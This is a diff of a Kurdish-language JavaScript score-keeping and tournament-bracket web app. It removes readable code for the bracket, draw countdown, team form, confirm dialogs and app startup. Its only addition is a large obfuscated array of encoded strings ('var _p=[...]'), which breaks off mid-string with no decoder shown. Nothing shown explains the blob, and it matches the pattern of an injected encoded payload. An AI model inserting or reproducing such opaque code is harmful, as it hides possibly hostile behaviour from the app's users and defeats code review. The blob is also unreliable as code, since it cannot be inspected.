-    else if(live){ chipClass += " live"; chipText = "یاری دەکرێت"; }
-    else if(m.a !== null && m.b !== null){ chipText = "ئامادەیە"; }
-
-    var head = document.createElement("div");
-    head.className = "mc-head";
-    head.innerHTML = '<span>یاری ' + toEastern(m.no) + '</span><span class="' + chipClass + '">' + chipText + '</span>';
-    card.appendChild(head);
-
-    card.appendChild(teamRow(m.a, m, "a"));
-    card.appendChild(teamRow(m.b, m, "b"));
-
-    if(m.a !== null && m.b !== null){
-      var btn = document.createElement("button");
-      btn.type = "button";
-      btn.className = "mc-btn";
-      if(m.winner !== null){ btn.classList.add("secondary"); btn.textContent = "بینینی خاڵەکان"; }
-      else if(live){ btn.textContent = "بەردەوامبە"; }
-      else { btn.textContent = "دەستپێبکە"; }
-      btn.addEventListener("click", function(){ soundClick(); startMatch(m.id); });
-      card.appendChild(btn);
-    }
-    return card;
-  }
-
-  /* ---- draw (5 second countdown) ---- */
-  var drawRoll = null, drawCountdown = null;
-
-  function startDraw(){
-    showScreen("drawScreen");
-    var left = 5;
-    var cEl = $("drawCount");
-    function setCount(){
-      cEl.textContent = toEastern(left);
-      cEl.classList.remove("tick");
-      void cEl.offsetWidth;
-      cEl.classList.add("tick");
-    }
-    setCount();
-    soundClick();
-
-    function rollNames(){
-      var names = T.teams;
-      var i = Math.floor(Math.random()*names.length);
-      var j = Math.floor(Math.random()*names.length);
-      if(names.length > 1){ while(j === i) j = Math.floor(Math.random()*names.length); }
-      $("drawA").textContent = names[i];
-      $("drawB").textContent = names[j];
-    }
-    rollNames();
-    drawRoll = setInterval(rollNames, 90);
-    drawCountdown = setInterval(function(){
-      left--;
-      if(left <= 0){ finishDraw(); return; }
-      setCount();
-      soundClick();
-    }, 1000);
-  }
-
-  function finishDraw(){
-    clearInterval(drawRoll); clearInterval(drawCountdown);
-    drawRoll = null; drawCountdown = null;
-    if(!T) return;
-    T.revealed = true;
-    saveTournament();
-    soundConfirm();
-    renderBracket(true);
-    showScreen("bracketScreen");
-  }
-
-  /* ---- generic confirm ---- */
-  var confirmCb = null;
-  function askConfirm(title, text, okLabel, cb){
-    $("confirmTitle").textContent = title;
-    $("confirmText").textContent = text;
-    $("confirmOk").textContent = okLabel || "باشە";
-    confirmCb = cb;
-    $("confirmOverlay").classList.add("show");
-  }
-
-  /* ---- setup: tournament form ---- */
-  var tRounds = 7;
-
-  function openSetupTab(mode){
-    document.querySelectorAll("#modeTabs .mode-tab").forEach(function(b){
-      b.classList.toggle("active", b.getAttribute("data-mode") === mode);
-    });
-    $("quickForm").style.display = mode === "quick" ? "" : "none";
-    $("tournForm").style.display = mode === "tourn" ? "" : "none";
-  }
-
-  function getTeamCount(){
-    var n = parseInt($("tCountInput").value, 10);
-    if(!n || n < 2) n = 2;
-    if(n > 32) n = 32;
-    return n;
-  }
-
-  function buildNameInputs(){
-    var n = getTeamCount();
-    var wrap = $("tournNames");
-    var old = [];
-    wrap.querySelectorAll("input").forEach(function(inp){ old.push(inp.value); });
-    wrap.innerHTML = "";
-    for(var i=0;i<n;i++){
-      var row = document.createElement("div");
-      row.className = "tname-row";
-      var num = document.createElement("span");
-      num.className = "tnum";
-      num.textContent = toEastern(i+1);
-      var inp = document.createElement("input");
-      inp.type = "text";
-      inp.maxLength = 20;
-      inp.autocomplete = "off";
-      inp.setAttribute("autocorrect","off");
-      inp.setAttribute("enterkeyhint", i === n-1 ? "go" : "next");
-      inp.value = old[i] || "";
-      (function(idx, el){
-        el.addEventListener("keydown", function(e){
-          if(e.key === "Enter"){
-            e.preventDefault();
-            var all = wrap.querySelectorAll("input");
-            if(idx < all.length-1) all[idx+1].focus();
-            else $("tournStartBtn").click();
-          }
-        });
-      })(i, inp);
-      row.appendChild(num);
-      row.appendChild(inp);
-      wrap.appendChild(row);
-    }
-  }
-
-  function setTeamCount(n){
-    if(n < 2) n = 2;
-    if(n > 32) n = 32;
-    $("tCountInput").value = n;
-    buildNameInputs();
-  }
-
-  function refreshResumeBox(){
-    var box = $("tournResume");
-    if(!box) return;
-    if(!T){ box.style.display = "none"; box.innerHTML = ""; return; }
-    var done = 0, total = 0;
-    T.rounds.forEach(function(list){ list.forEach(function(m){ if(!m.bye){ total++; if(m.winner !== null) done++; } }); });
-    var sub = T.finished ? ("پاڵەوان: " + T.teams[T.champion]) : (toEastern(done) + "/" + toEastern(total) + " یاری تەواو بوو");
-    box.style.display = "block";
-    box.innerHTML = '<div class="resume-title"></div><div class="resume-sub"></div>' +
-      '<div class="resume-actions"><button type="button" class="resume-go" id="resumeGo">بەردەوامبە</button>' +
-      '<button type="button" class="resume-del" id="resumeDel">سڕینەوە</button></div>';
-    box.querySelector(".resume-title").textContent = T.name;
-    box.querySelector(".resume-sub").textContent = sub;
-    $("resumeGo").addEventListener("click", function(){
-      if(!T.revealed){ T.revealed = true; saveTournament(); }
-      renderBracket(false);
-      showScreen("bracketScreen");
-    });
-    $("resumeDel").addEventListener("click", function(){ confirmDeleteTournament(); });
-  }
-
-  function confirmDeleteTournament(){
-    askConfirm("پاڵەوانێتی بسڕدرێتەوە؟", "هەموو یاری و ئەنجامەکانی پاڵەوانێتییەکە دەسڕدرێنەوە.", "بسڕەوە", function(){
-      clearTournament();
-      lsSet(K_VIEW, "q");
-      gameState = { sound: soundPref };
-      showScreen("setupScreen");
-    });
-  }
-
-  function startTournamentFromForm(){
-    var err = $("tournError");
-    var inputs = $("tournNames").querySelectorAll("input");
-    var names = [], seen = {}, bad = false, dup = false;
-    inputs.forEach(function(inp){
-      inp.classList.remove("dup");
-      var v = inp.value.trim();
-      if(!v){ bad = true; return; }
-      var key = v.toLowerCase();
-      if(seen[key]){ dup = true; inp.classList.add("dup"); }
-      seen[key] = true;
-      names.push(v);
-    });
-    if(bad){ err.textContent = "تکایە ناوی هەموو تیمەکان بنووسە"; err.classList.add("show"); return; }
-    if(dup){ err.textContent = "ناوی تیمەکان نابێت وەک یەک بن"; err.classList.add("show"); return; }
-    err.classList.remove("show");
-
-    var per = tRounds;
-    if(per === "custom"){
-      per = parseInt($("tCustomInput").value, 10);
-      if(!per || per < 1) per = 7;
-      if(per > 30) per = 30;
-    }
-    var name = $("tournName").value.trim() || "پاڵەوانێتی";
-
-    function go(){
-      T = buildTournament(name, names, per);
-      currentMatchId = null;
-      gameState = { sound: soundPref };
-      saveTournament();
-      lsSet(K_VIEW, "t");
-      startDraw();
-    }
-    if(T && !T.finished){
-      askConfirm("پاڵەوانێتی نوێ؟", "پاڵەوانێتییەکی نەتەواو هەیە. ئەگەر نوێ دروست بکەیت، ئەوی پێشوو دەسڕدرێتەوە.", "نوێ دروست بکە", go);
-    } else {
-      go();
-    }
-  }
-
-  function wireTournament(){
-    document.querySelectorAll("#modeTabs .mode-tab").forEach(function(b){
-      b.addEventListener("click", function(){ openSetupTab(b.getAttribute("data-mode")); });
-    });
-    $("tCountMinus").addEventListener("click", function(){ setTeamCount(getTeamCount()-1); });
-    $("tCountPlus").addEventListener("click", function(){ setTeamCount(getTeamCount()+1); });
-    $("tCountInput").addEventListener("change", function(){ setTeamCount(getTeamCount()); });
-    buildNameInputs();
-
-    document.querySelectorAll(".t-opt").forEach(function(btn){
-      btn.addEventListener("click", function(){
-        document.querySelectorAll(".t-opt").forEach(function(b){ b.classList.remove("selected"); });
-        btn.classList.add("selected");
-        var val = btn.getAttribute("data-rounds");
-        if(val === "custom"){ $("tCustomWrap").classList.add("show"); tRounds = "custom"; }
-        else { $("tCustomWrap").classList.remove("show"); tRounds = parseInt(val,10); }
-      });
-    });
-
-    $("tournStartBtn").addEventListener("click", startTournamentFromForm);
-    $("drawSkip").addEventListener("click", finishDraw);
-
-    $("bHomeBtn").addEventListener("click", function(){
-      lsSet(K_VIEW, "q");
-      showScreen("setupScreen");
-    });
-    $("bDeleteBtn").addEventListener("click", confirmDeleteTournament);
-
-    $("confirmCancel").addEventListener("click", function(){
-      $("confirmOverlay").classList.remove("show"); confirmCb = null;
-    });
-    $("confirmOk").addEventListener("click", function(){
-      $("confirmOverlay").classList.remove("show");
-      var cb = confirmCb; confirmCb = null;
-      if(cb) cb();
-    });
-  }
-
-  /* ---------------- Init ---------------- */
-  function initializeApp(){
-    wireSetupScreen();
-    wireScoreScreen();
-    wireScoreModal();
-    wireIcons();
-    wireTournament();
-    buildQuickButtons();
-    preventPinchAndDoubleTapZoom();
-
-    var savedSound = null;
-    try{ savedSound = localStorage.getItem(K_SOUND); }catch(e){}
-
-    soundPref = savedSound === null ? true : savedSound === "1";
-    loadTournament();
-    var view = null;
-    try{ view = localStorage.getItem(K_VIEW); }catch(e){}
-
-    var restored = loadCurrentGame();
-    var am = (T && T.activeMatchId) ? getMatch(T.activeMatchId) : null;
-
-    if(T && view === "t"){
-      if(am && am.game){
-        gameState = am.game;
-        gameState.sound = soundPref;
-        currentMatchId = am.id;
-        renderScoreScreen();
-        showScreen("scoreScreen");
-        requestWakeLock();
-      } else {
-        gameState = { sound: soundPref };
-        if(!T.revealed){ T.revealed = true; saveTournament(); }
-        renderBracket(false);
-        showScreen("bracketScreen");
-      }
-    } else if(restored && restored.team1Name && restored.team2Name && Array.isArray(restored.roundsData)){
-      gameState = restored;
-      if(gameState.historySaved === undefined) gameState.historySaved = false;
-      if(!gameState.startedAt) gameState.startedAt = Date.now();
-      if(savedSound !== null) gameState.sound = savedSound === "1";
-      renderScoreScreen();
-      showScreen("scoreScreen");
-      requestWakeLock();
-    } else {
-      gameState = { sound: soundPref };
-      loadLastSetup();
-      showScreen("setupScreen");
-    }
-
-    setInterval(updateTimerDisplay, 1000);
-
-    document.addEventListener("visibilitychange", function(){
-      if(document.visibilityState === "visible" && gameState && gameState.startedAt){
-        requestWakeLock();
-      }
-    });
-  }
-
-  /* ---------------- Prevent pinch/double-tap zoom (feel native) ---------------- */
-  function preventPinchAndDoubleTapZoom(){
-    document.addEventListener("touchmove", function(e){
-      if(e.touches && e.touches.length > 1) e.preventDefault();
-    }, { passive:false });
-
-    var lastTouchEnd = 0;
-    document.addEventListener("touchend", function(e){
-      var now = Date.now();
-      if(now - lastTouchEnd <= 300) e.preventDefault();
-      lastTouchEnd = now;
-    }, { passive:false });
-
-    document.addEventListener("gesturestart", function(e){ e.preventDefault(); });
-  }
-
-  document.addEventListener("DOMContentLoaded", function(){ restoreFromMirror(initializeApp); });
-
-  // Save the running game whenever the page is hidden / closed
-  function flushGame(){ if(currentMatchId && T){ saveTournament(); } else if(gameState && gameState.roundsData){ saveCurrentGame(); } }
-  document.addEventListener("visibilitychange", function(){ if(document.visibilityState === "hidden") flushGame(); });
-  window.addEventListener("pagehide", flushGame);
+  var _p=["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